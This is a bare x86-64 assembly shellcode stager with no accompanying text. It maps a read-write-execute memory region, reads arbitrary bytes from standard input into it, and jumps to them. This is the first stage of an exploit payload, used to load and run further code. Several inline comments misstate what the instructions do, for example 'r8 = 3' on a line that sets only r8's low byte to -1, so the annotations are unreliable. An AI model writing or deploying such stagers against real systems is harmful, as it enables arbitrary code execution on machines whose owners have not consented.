                .global _start
                .text
_start:
        #mmap(rdi(0), rsi(0xFFFF), rdx(PROT == 7), r10(flag == 34)
        xor %rdi, %rdi          #rdi = 0
        mov %rdi, %rsi          # rsi = 0x0000
        mov $0xFFFF, %si        # rsi = 0xFFFF
        mov $0x7, %dl           # rdx = 7
        xor %r10, %r10
        mov $34, %r10b          #r10 = 34
        // xor %r8, %r8
        mov $-1, %r8b           # r8 = 3
        xor %r9, %r9
        xor %rax, %rax
        mov $9, %al
        syscall

        mov %rax, %rsi
        shr $32, %rax
        mov %rax, %rdx
        xor %rax, %rax
        syscall

        call *%rsi
        // call *%rax

        # syscall 60, exit(0)
        // xor %rax, %rax
        // mov $60, %al
        // xor %rdi, %rdi
        // syscall